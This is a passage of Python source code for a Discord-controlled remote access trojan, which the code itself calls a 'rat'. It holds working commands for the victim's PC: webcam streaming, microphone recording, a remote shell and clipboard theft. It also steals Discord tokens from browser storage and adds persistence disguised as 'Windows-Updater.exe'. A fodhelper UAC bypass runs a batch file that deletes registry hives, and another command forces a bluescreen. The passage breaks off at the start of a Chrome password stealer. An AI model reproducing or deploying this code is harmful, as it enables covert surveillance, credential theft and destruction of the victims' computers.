            async def StreamWebcam(end):
                temp = (os.getenv('TEMP'))
                hellos = temp + r"\\hobos\\hellos.txt"        
                if os.path.isfile(hellos):
                    os.system(r"del %temp%\\hobos\\hellos.txt /f")
                    os.system(r"RMDIR %temp%\\hobos /s /q")     
                else:
                    pass
                while time.time() < end:
                    temp = os.path.join(os.getenv('TEMP') + "\\webcam.jpg")
                    camera = cv2.VideoCapture(0)
                    return_value,image = camera.read()
                    cv2.imwrite(temp,image)
                    camera.release()
                    file = discord.File(temp, filename="webcam.jpg")
                    await ctx.send(file=file)
                    hellos = temp + r"\\hobos\\hellos.txt"
                    if os.path.isfile(hellos):
                        break
                    else:
                        continue

                if time.time() > end:
                 my_embed = discord.Embed(title="Webcam", description="Finished streaming the clients webcam.", color=16777215)
                 my_embed.set_thumbnail(url=f"{embedlogo}")
                 await ctx.send(embed=my_embed)
            
            my_embed = discord.Embed(title="Webcam", description=f"Streaming the clients webcam for **{seconds_length}** Seconds", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            await StreamWebcam(end) 
        except Exception as e:
            my_embed = discord.Embed(title="Webcam", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            
@slash.slash(name="displayon", description="Turns the clients display on.", guild_ids=g)
async def DisplayON_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                keyboard = Controller()
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                ctypes.windll.user32.BlockInput(False)
                my_embed = discord.Embed(title="Display", description="Successfully turned on the clients display.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title="Display", description=f"Session requires admin permissions to use this command.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Display", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="displayoff", description="Turns the clients display off.", guild_ids=g)
async def DisplayOFF_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                my_embed = discord.Embed(title="Display", description="Successfully turned off the clients display.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title="Display", description=f"Session does not have admin permissions.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Display", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="taskkill", description="Kills the selected task on the clients PC.", guild_ids=g)
async def TaskKill_command(ctx: SlashContext, tasktokill: str):
    if ctx.channel.name == channel_name:
        try:
            os.system(f"taskkill /F /IM {tasktokill}")
            my_embed = discord.Embed(title="Taskkill", description=f"Successfully killed: **{tasktokill}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Taskkill", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="portscanner", description="Scans clients local/public IP address for open ports.", guild_ids=g)
async def OpenPortScan_command(ctx: SlashContext, ip: str, starting_port: int, ending_port: int, thread_amount: int):
    if ctx.channel.name == channel_name:
        try:
            # ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
            target = ip
            queue = Queue()
            open_ports = []

            def portscan(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target, port))
                    return True
                except:
                    return False

            def get_ports(starting_port, ending_port):
                for port in range(starting_port, ending_port):
                    queue.put(port)
                

            def worker():
                while not queue.empty():
                    port = queue.get()
                    if portscan(port):
                        open_ports.append(port)

            async def run_scanner(thread_amount, starting_port, ending_port):

                get_ports(starting_port, ending_port)

                thread_list = []

                for t in range(thread_amount):
                    thread = threading.Thread(target=worker)
                    thread_list.append(thread)

                for thread in thread_list:
                    thread.start()

                for thread in thread_list:
                    thread.join()

                my_embed = discord.Embed(title="Port Scanner", description=f"Open ports: {open_ports}", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)

            my_embed = discord.Embed(title="Port Scanner", description="Scanning ports, please wait!", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            await run_scanner(thread_amount, starting_port, ending_port)
        except Exception as e:
            my_embed = discord.Embed(title="Port Scanner", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)



@slash.slash(name="hiderat", description="Hides the rat on the clients PC.", guild_ids=g)
async def HideRAT_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system("""attrib +h "{}" """.format(cmd237))
            my_embed = discord.Embed(title="Hide Rat", description="Rat is now hidden on clients PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Hide Rat", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="unhiderat", description="Unhides the rat on the clients PC.", guild_ids=g)
async def UnHideRAT_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system("""attrib -h "{}" """.format(cmd237))
            my_embed = discord.Embed(title="Hide Rat", description=f"Rat is now unhidden on clients PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Hide Rat", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="shell", description="Allows you to enter commands on the clients PC.", guild_ids=g)
async def Shell_command(ctx: SlashContext, command: str):
    if ctx.channel.name == channel_name:
        try:
            global status
            status = None
            instruction = command
            def shell(command):
                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output.stdout.decode('CP437').strip()
            out = shell(instruction)
            if status:
                numb = len(out)
                if numb < 1:
                    my_embed = discord.Embed(title="Shell", description="Command is not recognized or no output was obtained.", color=16777215)
                    my_embed.set_thumbnail(url=f"{embedlogo}")
                    await ctx.send(embed=my_embed)
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    f1 = open(temp + r"\\output.txt", 'a')
                    f1.write(out)
                    f1.close()
                    file = discord.File(temp + r"\\output.txt", filename="output.txt")
                    my_embed = discord.Embed(title="Shell", description="Command was executed on the clients PC.", color=16777215)
                    my_embed.set_thumbnail(url=f"{embedlogo}")
                    await ctx.send(embed=my_embed)
                    await ctx.send(file=file)
                    os.remove(temp + r"\\output.txt")
                else:
                    my_embed = discord.Embed(title="Shell", description=f"The following command was executed on the clients PC: `{out}`", color=16777215)
                    my_embed.set_thumbnail(url=f"{embedlogo}")
                    await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title="Shell", description="Command is not recognized or no output was obtained.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
                status = None
        except Exception as e:
            my_embed = discord.Embed(title="Shell", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="write", description="Writes the following text on the clients PC.", guild_ids=g)
async def Write_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        try:
            my_embed = discord.Embed(title="Write", description="Writing, please wait!", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            for letter in message:
                pyautogui.typewrite(letter);sleep(0.0001)
            my_embed = discord.Embed(title="Write", description=f"Successfully wrote **{message}** on the clients PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Write", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="shutdown", description="Shuts down the clients PC.", guild_ids=g)
async def Shutdown_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            os.system("shutdown /p")
            my_embed = discord.Embed(title="Shutdown", description=f"Successfully shutdowned **{os.getlogin()}** PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Shutdown", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="restart", description="Restarts the clients PC.", guild_ids=g)
async def Restart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            os.system("shutdown /r /t 00")
            my_embed = discord.Embed(title="Restart", description=f"Successfully restarted **{os.getlogin()}** PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Restart", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="logoff", description="Logs the client off their PC.", guild_ids=g)
async def LogOff_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            os.system("shutdown /l /f")
            my_embed = discord.Embed(title="Logoff", description=f"Successfully logged **{os.getlogin()}** off their PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Logoff", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="deletefile", description="Permanently deletes a file off the clients PC.", guild_ids=g)
async def DeleteFile_command(ctx: SlashContext, filedirectory: str):
    if ctx.channel.name == channel_name:
        try:
            global statue
            instruction = (filedirectory)
            instruction = "del " + '"' + instruction + '"' + " /F"
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            global statue
            statue = "ok"
            if statue:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb > 0:
                    my_embed = discord.Embed(title="Delete File", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
                    my_embed.set_thumbnail(url=f"{embedlogo}")
                    await ctx.send(embed=my_embed)
                else:
                    my_embed = discord.Embed(title="Delete File", description="File was successfully deleted off the clients PC.", color=16777215)
                    my_embed.set_thumbnail(url=f"{embedlogo}")
                    await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title="Logoff", description="Command is not recognized or no output was obtained", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
                statue = None
        except Exception as e:
            my_embed = discord.Embed(title="Delete File", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="breakpc", description="Breaks the clients PC. (Very harmful)", guild_ids=g)
async def BreakPc_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes.wintypes
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="✔"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="❌"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to break the clients PC?", components=[action_row])
        res = await client.wait_for('button_click')
        if res.component.label == "✔":
            ###### CREATE BATCH FILE ######
            temp = (os.getenv("temp"))
            bat = """
    reg delete "HKEY_LOCAL_MACHINE\HARDWARE" /f
    reg delete "HKEY_LOCAL_MACHINE\SOFTWARE" /f
    reg delete "HKEY_CURRENT_CONFIG\System" /f
    reg delete "HKEY_CURRENT_CONFIG\Software" /f
    reg delete "HKEY_CURRENT_USER\System" /f
    reg delete "HKEY_CURRENT_USER\Volatile Environment" /f
    reg delete "HKEY_CURRENT_USER\Control Panel" /f
    reg delete "HKEY_CURRENT_USER\Software" /f
    cls
            """
            temp2 = temp + r"\\break.bat"
            if os.path.isfile(temp2):
                os.remove(temp2)
            f6 = open(temp + r"\\break.bat", 'w')
            f6.write(bat)
            f6.close()

            ###### FORCE RUN BATCH FILE AS ADMIN ######
            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")
            time.sleep(2)
            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
            os.system(remove_reg)
            await ctx.send(content="Successfully broke the clients PC.", hidden=True)
        else:
            await ctx.send(content="Cancelled!", hidden=True)

@slash.slash(name="bluescreen", description="Crashes the clients PC.", guild_ids=g)
async def Bluescreen_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes.wintypes
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="✔"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="❌"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to bluescreen the clients PC?", components=[action_row])
        res = await client.wait_for('button_click')
        if res.component.label == "✔":
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
            await ctx.send(content="Successfully bluescreened the clients PC.", hidden=True)
        else:
            await ctx.send(content="*Cancelled!", hidden=True)


@slash.slash(name="clipboard", description="Grathers the clients clipboard.", guild_ids=g)
async def Clipboard_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            my_embed = discord.Embed(title="Clipboard", description=f"Clients clipboard: **{data}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Clipboard", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="admincheck", description="Checks if the session has admin permissions.", guild_ids=g)
async def AdminCheck_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                my_embed = discord.Embed(title="Admin Check", description="This session has admin permissions.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title="Admin Check", description="This session does not have admin permissions.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Admin Check", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="idlecheck", description=f"Checks how long the client was idle for.", guild_ids=g)
async def IdleTime_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            class LASTINPUTINFO(ctypes.Structure):
                    _fields_ = [
                        ('cbSize', ctypes.c_uint),
                        ('dwTime', ctypes.c_int),
                    ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
                if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
                    millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            duration = get_idle_duration()
            my_embed = discord.Embed(title="Idle check", description=f"Client was idle for **{duration:.2f}** seconds.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Idle check", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="renableinput", description="Renables the clients keyboard and mouse.", guild_ids=g)
async def UnblockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ctypes.windll.user32.BlockInput(False)
                my_embed = discord.Embed(title="Input", description="Renabled the clients keyboard and mouse.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title="Input", description="Session requires admin permissions to use this command.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Input", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="disableinput", description="Disables the clients keyboard and mouse.", guild_ids=g)
async def BlockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ctypes.windll.user32.BlockInput(True)
                my_embed = discord.Embed(title="Input", description="Disabled the clients keyboard and mouse.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title="Input", description="Session requires admin permissions to use this command.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Input", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            

@slash.slash(name="messagebox", description="Sends a message pop up on the clients PC.", guild_ids=g)
async def MessageBox_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        def msgbox(message, type):
            return ctypes.windll.user32.MessageBoxW(0, message, "Attention!", type | 0x1000)

        select = create_select(
        options=[
            create_select_option(label="Info", value="Infos", emoji="❕"),
            create_select_option(label="Question", value="Questions", emoji="❔"),
            create_select_option(label="Warning", value="Warnings", emoji="⚠"),
            create_select_option(label="Error", value="Errors", emoji="🚫"),
        ],
        placeholder="Choose your type", 
        min_values=1,
        max_values=1,
    )   
        await ctx.send("What messagebox method you want it to pop up on the clients PC?", components=[create_actionrow(select)])

        select_ctx: ComponentContext = await wait_for_component(client, components=[create_actionrow(select)])
        if select_ctx.selected_options[0] == 'Infos':
            threading.Thread(target=msgbox, args=(message, 64)).start()
            await select_ctx.edit_origin(content=f"Sent an info message saying: **{message}**")
        elif select_ctx.selected_options[0] == 'Questions':
            threading.Thread(target=msgbox, args=(message, 32)).start()
            await select_ctx.edit_origin(content=f"Sent an question message saying: **{message}**")
        elif select_ctx.selected_options[0] == 'Warnings':
            threading.Thread(target=msgbox, args=(message, 48)).start()
            await select_ctx.edit_origin(content=f"Sent an warning message saying: **{message}**")
        elif select_ctx.selected_options[0] == 'Errors':
            threading.Thread(target=msgbox, args=(message, 16)).start()
            await select_ctx.edit_origin(content=f"Sent an error message saying: **{message}**")


@slash.slash(name="persistence", description="Makes the rat persist of the clients PC.", guild_ids=g)
async def Persistence_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
            if not os.path.exists(backdoor_location):
                shutil.copyfile(sys.executable, backdoor_location)
                sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
                my_embed = discord.Embed(title="Persistence", description="Persistent update created on the clients PC.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                os.remove(backdoor_location)
                shutil.copyfile(sys.executable, backdoor_location)
                sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
                my_embed = discord.Embed(title="Persistence", description="Persistent update created on the clients PC.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Persistence", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="recordaudio", description="Records the clients microphone audio.", guild_ids=g)
async def RecordAudio_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            

            temp = (os.getenv("temp") + '\\Audio.wav')
            fs = 44100  # Sample rate
            seconds = 10  # Duration of recording

            my_embed = discord.Embed(title="Record Audio", description="Recording clients microphone audio, please wait!", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(temp, fs, myrecording)
            file = discord.File(temp, filename="Audio.wav")
            my_embed = discord.Embed(title="Record Audio", description="Successfully recorded the clients microphone audio.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            await ctx.send(file=file)
            os.remove(temp)
        except Exception as e:
            my_embed = discord.Embed(title="Record Audio", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="startup", description="Adds the rat to the clients startup apps.", guild_ids=g)
async def Startup_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:  
                path = sys.argv[0]
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if isexe:
                    os.system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y' )
                else:
                    os.system(r'copy "{}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs" /Y'.format(path))
                    e = r"""
    Set objShell = WScript.CreateObject("WScript.Shell")
    objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}", 0, True
    """.format(os.path.basename(sys.argv[0]))
                    with open(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                        f.write(e)
                        f.close()
                my_embed = discord.Embed(title="Startup", description="Successfully added the rat to the clients startup apps.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title="Startup", description="Session requires admin permissions to use this command.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Startup", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)



#Discordtoken
@slash.slash(name="discordtokens", description="Collects the clients discord tokens. (Hopefully)", guild_ids=g)
async def TokenExtractor_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title="Discord Token Collector", description="Collecting the clients discord tokens, please wait!", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
        tokens = []
        saved = ""
        paths = {
            'Discord': os.getenv('APPDATA') + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': os.getenv('APPDATA') + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': os.getenv('APPDATA') + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': os.getenv('APPDATA') + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': os.getenv('APPDATA') + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': os.getenv('LOCALAPPDATA') + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': os.getenv('LOCALAPPDATA') + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': os.getenv('LOCALAPPDATA') + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': os.getenv('LOCALAPPDATA') + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': os.getenv('LOCALAPPDATA') + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': os.getenv('LOCALAPPDATA') + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': os.getenv('LOCALAPPDATA') + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': os.getenv('LOCALAPPDATA') + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': os.getenv('LOCALAPPDATA') + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': os.getenv('LOCALAPPDATA') + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
        for token in tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                "Authorization": token
            })
            if r.status_code == 200:
                if token in saved:
                    continue
                saved += f"`{token}`\n\n"
        if saved != "":
            my_embed = discord.Embed(title="Discord Token Collector", description=f"Successfully collected the clients discord tokens:\n**{saved}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        else:
            my_embed = discord.Embed(title="Discord Token Collector", description="Client didnt have any saved tokens.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="passwords", description="Collects all the clients passwords. (Hopefully)", guild_ids=g)
async def Passwordextractor_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title="Password Collector", description="Collecting the clients saved passwords, please wait!", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
        def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
